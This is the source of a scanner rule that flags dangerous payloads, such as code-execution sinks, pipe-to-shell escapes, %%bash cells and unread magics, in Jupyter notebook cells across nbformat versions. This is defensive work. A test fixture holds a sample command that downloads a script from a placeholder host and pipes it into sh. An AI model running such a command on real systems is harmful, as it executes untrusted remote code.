import ast
import json
import re
from collections.abc import Generator, Iterable, Iterator
from dataclasses import dataclass, field
from pathlib import Path

from guardana.core.evaluator.base import Verdict
from guardana.core.report import Evidence, Finding
from guardana.core.rule import RuleContext, RuleMeta
from guardana.core.rule.fixture import FixtureOutcome, RuleFixture, materialise
from guardana.core.safety import Detection
from guardana.core.severity import Severity
from guardana.core.source import PythonSource
from guardana.core.target import Capability, FileReader, Target, TargetKind
from guardana.core.taxonomy import (
    NIST_SUPPLY_CHAIN,
    OWASP_ASI05_2026,
    OWASP_LLM03_2025,
    OWASP_LLM04_2026,
)
from guardana.rules._base import ArtifactRule
from guardana.rules.supply_chain import _samples
from guardana.rules.supply_chain._code_sinks import code_sinks
from guardana.rules.supply_chain._ipython_cells import (
    PIPE_TO_SHELL,
    CellReading,
    NotebookState,
    bind_names,
    ipython_calls,
    local_scripts,
    read_cell,
    read_shell_command,
)
from guardana.rules.supply_chain._leads import lead_verdict, unread_component, unscanned_verdict
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES, read_text_prefix

# How deep calls on the IPython object may nest inside the code they run before the
# rest is reported unread.
_MAX_IPYTHON_NESTING = 4
_SCRIPTS_LISTED = 5


@dataclass
class _NotebookScan:
    """One reading of a notebook's cells: its path, the state its cells build, what was unread."""

    path: Path
    ctx: RuleContext
    unread: set[str]
    """What was reported unread in any reading of the notebook, named once per notebook."""
    state: NotebookState = field(default_factory=NotebookState)
    scripts: list[str] = field(default_factory=list)
    """The local scripts the cell being read runs, as written."""


@dataclass(frozen=True, slots=True)
class _Cell:
    """One code cell as one reader of the notebook format runs it."""

    ref: str
    """Where the cell sits, as a finding's target names it: `cell3`, `worksheet0.cell3`."""
    label: str
    source: str | None
    """The code the cell runs; None when the cell is malformed and runs nothing readable."""
    problem: str | None = None


# Each reading is the cells one reader runs and the field it takes their code from:
# nbformat 4 readers run `source`; nbformat upgrades a notebook that declares no
# version as v1, taking `code`, and a v2 or v3 one by replacing its cells with those
# of its worksheets, taking `input`. A reader that ignores the version runs the
# top-level cells, so every reading is scanned rather than the one the version names.
_V4_FIELD = "source"
_V1_FIELD = "code"
_V3_FIELD = "input"


def _text(value: object) -> str | None:
    """Return a cell field as the code it holds: a string, or a list of lines joined."""
    if isinstance(value, list) and all(isinstance(line, str) for line in value):
        return "".join(value)
    return value if isinstance(value, str) else None


def _code_cell(cell: object, ref: str, label: str, name: str, *, required: bool) -> _Cell | None:
    """Read field `name` of one cell; None for a cell that runs no code in this reading."""
    if not isinstance(cell, dict):
        return _Cell(ref, label, None, "is not a JSON object")
    if cell.get("cell_type") != "code" or (name not in cell and not required):
        return None
    source = _text(cell.get(name))
    problem = None if source is not None else "has a source that is not text"
    return _Cell(ref, label, source, problem)


def _top_level_readings(cells: list[object]) -> list[list[_Cell]]:
    """Read the top-level cells as nbformat 4 and as nbformat 1 run them."""
    current: list[_Cell] = []
    legacy: list[_Cell] = []
    for index, cell in enumerate(cells):
        ref, label = f"cell{index}", f"cell {index}"
        # A v1 code cell holds its code in `code` alone, so its missing `source` hides nothing.
        legacy_only = isinstance(cell, dict) and _V1_FIELD in cell and _V4_FIELD not in cell
        read = _code_cell(cell, ref, label, _V4_FIELD, required=not legacy_only)
        if read is not None:
            current.append(read)
        if isinstance(cell, dict):
            old = _code_cell(cell, ref, label, _V1_FIELD, required=False)
            if old is not None:
                legacy.append(old)
    return [current, legacy]


def _worksheet_reading(worksheets: list[object]) -> list[_Cell]:
    """Read the worksheet cells, flattened in order, as nbformat's v3 upgrade runs them."""
    reading: list[_Cell] = []
    for number, worksheet in enumerate(worksheets):
        cells = worksheet.get("cells") if isinstance(worksheet, dict) else None
        if not isinstance(cells, list):
            ref, label = f"worksheet{number}", f"worksheet {number}"
            reading.append(_Cell(ref, label, None, "holds no list of cells"))
            continue
        for index, cell in enumerate(cells):
            ref, label = f"worksheet{number}.cell{index}", f"worksheet {number} cell {index}"
            read = _code_cell(cell, ref, label, _V3_FIELD, required=False)
            if read is not None:
                reading.append(read)
    return reading


def _readings(doc: dict[str, object]) -> tuple[list[list[_Cell]], str | None]:
    """Return every reading of the notebook's cells, or why it has no cells to read."""
    cells, worksheets = doc.get("cells"), doc.get("worksheets")
    readings: list[list[_Cell]] = []
    if isinstance(cells, list):
        readings.extend(_top_level_readings(cells))
    elif "cells" in doc:
        readings.append([_Cell("cells", "cells", None, "is not a list")])
    if isinstance(worksheets, list):
        readings.append(_worksheet_reading(worksheets))
    elif "worksheets" in doc:
        readings.append([_Cell("worksheets", "worksheets", None, "is not a list")])
    if not readings:
        return [], "the notebook declares no list of cells"
    return readings, None


def _languages(doc: dict[str, object]) -> list[str]:
    """Return the kernel languages a notebook declares, in the metadata IPython writes."""
    metadata = doc.get("metadata")
    if not isinstance(metadata, dict):
        return []
    declared: list[object] = []
    kernelspec = metadata.get("kernelspec")
    if isinstance(kernelspec, dict):
        declared.append(kernelspec.get("language"))
    language_info = metadata.get("language_info")
    if isinstance(language_info, dict):
        declared.append(language_info.get("name"))
    return [
        value if isinstance(value, str) else repr(value)
        for value in declared
        if value is not None and not (isinstance(value, str) and not value.strip())
    ]


def _is_python(language: str) -> bool:
    return re.fullmatch(r"i?python[\d.]*", language.strip().lower().replace(" ", "")) is not None


class NotebookPayloadRule(ArtifactRule):
    """Flags dangerous code and shell payloads inside Jupyter notebook (`.ipynb`) cells.

    Notebooks are a primary ML distribution format, yet the `.py` scanners never
    see inside them. This applies the shared code-sink detection to each code
    cell, and catches the notebook-only channels: a `!curl … | sh` escape, a
    `%%bash` cell or a `%alias`. The cells nbformat runs from an older notebook are
    read too: a v1 cell's `code` and the cells of v2 and v3 worksheets. A cell that runs
    a local script (`!sh setup.sh`, `%%bash` running `./run`) gets one low finding naming
    it. A cell whose Python cannot be parsed, a magic that runs code the rule does not
    read (`%run`, `%pip`, `%%perl`), code handed the IPython object and a notebook whose
    kernel is not Python are reported as inconclusive, never silently skipped: an
    un-analyzable cell is not a proven-clean one.
    """

    meta = RuleMeta(
        id="guardana.supply_chain.notebook_payload",
        title="Dangerous payload in a notebook cell",
        severity=Severity.HIGH,
        target_kind=TargetKind.ARTIFACT,
        taxonomy=(
            OWASP_LLM03_2025,
            OWASP_LLM04_2026,
            NIST_SUPPLY_CHAIN,
            OWASP_ASI05_2026,
        ),
        required_capabilities=frozenset({Capability.READ_FILES}),
        detection=Detection.HEURISTIC,
    )

    def fixtures(self) -> Iterable[RuleFixture]:
        """Sample a download piped to a shell, a plain cell and a notebook that is not JSON."""
        return materialise(
            (
                _samples.sample(
                    "a shell escape piping a download into sh",
                    FixtureOutcome.FINDING,
                    {
                        "setup.ipynb": _samples.notebook(
                            "!curl -s https://setup.example.invalid/i.sh | sh\n"
                        )
                    },
                ),
                _samples.sample(
                    "a cell that only prints",
                    FixtureOutcome.CLEAN,
                    {
                        "setup.ipynb": _samples.notebook(
                            "import json\nprint(json.dumps({'ok': True}))\n"
                        )
                    },
                ),
                _samples.sample(
                    "a notebook cut off mid-document",
                    FixtureOutcome.INCONCLUSIVE,
                    {"setup.ipynb": _samples.notebook("print(1)\n")[:-2]},
                ),
            )
        )

    def run(self, target: Target, ctx: RuleContext) -> Iterable[Finding]:
        """Scan every `.ipynb` for code-execution sinks and shell payloads."""
        if not isinstance(target, FileReader):
            return
        for path in target.iter_files((".ipynb",)):
            yield from self._scan(path, ctx)

    def _scan(self, path: Path, ctx: RuleContext) -> Iterator[Finding]:
        prefix = read_text_prefix(path, errors="ignore")
        if prefix is None:
            yield self._unscanned(path, "the file could not be read", ctx)
            return
        raw, truncated = prefix
        if truncated:
            yield self._unscanned(
                path, f"the file is larger than the {MAX_SCAN_BYTES}-byte read bound", ctx
            )
            return
        try:
            doc = json.loads(raw)
        except (ValueError, RecursionError):
            # Not one cell was examined, so a malformed notebook is no cleaner than
            # one that holds a payload.
            yield self._unscanned(path, "the notebook could not be parsed as JSON", ctx)
            return
        readings, empty = _readings(doc) if isinstance(doc, dict) else ([], "not a JSON object")
        if empty is not None:
            yield self._unscanned(path, empty, ctx)
            return
        foreign = next((name for name in _languages(doc) if not _is_python(name)), None)
        if foreign is not None:
            reason = f"its kernel language is {foreign}, which this rule does not read"
            yield self._unscanned(path, reason, ctx)
            return
        yield from self._scan_readings(path, readings, ctx)

    def _scan_readings(
        self, path: Path, readings: list[list[_Cell]], ctx: RuleContext
    ) -> Iterator[Finding]:
        """Scan each reading of a notebook's cells; report the first malformed cell once."""
        unread: set[str] = set()
        malformed: str | None = None
        for reading in readings:
            # Each reader runs its own cells, so names one reading binds bind nothing in another.
            scan = _NotebookScan(path, ctx, unread)
            for cell in reading:
                if cell.source is None:
                    malformed = malformed or f"{cell.label} {cell.problem}"
                    continue
                yield from self._scan_cell(scan, cell, read_cell(cell.source, scan.state))
                yield from self._local_scripts(scan, cell)
        if malformed is not None:
            yield self._unscanned(path, malformed, ctx)

    def _unscanned(self, path: Path, reason: str, ctx: RuleContext) -> Finding:
        """Say the notebook was not examined, rather than returning as if it were clean."""
        ctx.shortfall(unread_component(self.meta.id, path, reason))
        return Finding(
            rule_id=self.meta.id,
            severity=Severity.LOW,
            title="Notebook not scanned",
            taxonomy=self.meta.taxonomy,
            target_ref=str(path),
            evidence=Evidence(
                summary=f"notebook not scanned: {reason}", detail=f"file={path.name}"
            ),
            verdict=unscanned_verdict("the notebook could not be read, so nothing was cleared"),
        )

    def _scan_cell(
        self, scan: _NotebookScan, where: _Cell, cell: CellReading, depth: int = 0
    ) -> Iterator[Finding]:
        path = scan.path
        scan.state.bound |= cell.bound
        for line in cell.shell:
            if PIPE_TO_SHELL.search(line):
                yield self._finding(
                    path, where, Severity.HIGH, "shell escape pipes a download into a shell"
                )
            scan.scripts.extend(local_scripts(line))
        for label in dict.fromkeys(cell.unread):
            yield self._unread(scan, where, label)
        tree = yield from self._parse(scan, where, cell)
        if tree is None:
            return
        bind_names(tree, scan.state)
        # A notebook cell is source without a file of its own, so it is wrapped in
        # the same index the `.py` rules use — one walk, and `code_sinks` needs no
        # second shape to understand.
        for _lineno, why, lead in code_sinks(PythonSource(path, cell.python, tree)):
            yield self._finding(
                path, where, Severity.HIGH, why, lead_verdict(why) if lead else None
            )
        for kind, text in ipython_calls(tree, scan.state):
            if text is None or depth >= _MAX_IPYTHON_NESTING:
                yield self._unread(scan, where, kind)
                continue
            nested = read_shell_command(text) if kind == "shell" else read_cell(text, scan.state)
            yield from self._scan_cell(scan, where, nested, depth + 1)

    def _local_scripts(self, scan: _NotebookScan, where: _Cell) -> Iterator[Finding]:
        """Name, in one low finding, the local scripts a cell runs, whose code is not read."""
        scripts = list(dict.fromkeys(scan.scripts))
        scan.scripts.clear()
        if not scripts:
            return
        listed = ", ".join(scripts[:_SCRIPTS_LISTED])
        more = len(scripts) - _SCRIPTS_LISTED
        noun = "local script" if len(scripts) == 1 else "local scripts"
        yield self._finding(
            scan.path,
            where,
            Severity.LOW,
            f"cell runs {noun}: {listed}{f', and {more} more' if more > 0 else ''}",
        )

    def _unread(self, scan: _NotebookScan, where: _Cell, label: str) -> Finding:
        """Report something a cell runs that was not read; name it once per notebook."""
        if label not in scan.unread:
            scan.unread.add(label)
            reason = f"{label} runs code or input this rule does not read"
            scan.ctx.shortfall(unread_component(self.meta.id, scan.path, reason))
        return self._finding(
            scan.path,
            where,
            Severity.LOW,
            f"cell runs {label}, which this rule does not read",
            unscanned_verdict(f"what {label} runs was not read, so it was not cleared"),
        )

    def _parse(
        self, scan: _NotebookScan, where: _Cell, cell: CellReading
    ) -> Generator[Finding, None, ast.Module | None]:
        """Parse a cell's Python; return its tree, or None after reporting why there is none."""
        try:
            tree = None if cell.too_complex else ast.parse(cell.python)
        except (MemoryError, RecursionError):
            tree = None
        except SyntaxError:
            yield self._finding(
                scan.path,
                where,
                Severity.LOW,
                "notebook cell could not be parsed as Python; not analyzed",
                unscanned_verdict("the cell could not be parsed, so nothing in it was cleared"),
            )
            return None
        if tree is None:
            if "too complex" not in scan.unread:
                scan.unread.add("too complex")
                reason = "a cell is too complex for the Python parser"
                scan.ctx.shortfall(unread_component(self.meta.id, scan.path, reason))
            yield self._finding(
                scan.path,
                where,
                Severity.LOW,
                "notebook cell is too complex to parse as Python; not analyzed",
                unscanned_verdict("the cell could not be parsed, so nothing in it was cleared"),
            )
        return tree

    def _finding(
        self,
        path: Path,
        where: _Cell,
        severity: Severity,
        summary: str,
        verdict: Verdict | None = None,
    ) -> Finding:
        return Finding(
            rule_id=self.meta.id,
            severity=severity,
            title=self.meta.title,
            taxonomy=self.meta.taxonomy,
            target_ref=f"{path}:{where.ref}",
            evidence=Evidence(summary=summary, detail=f"{path.name} {where.label}"),
            verdict=verdict,
        )
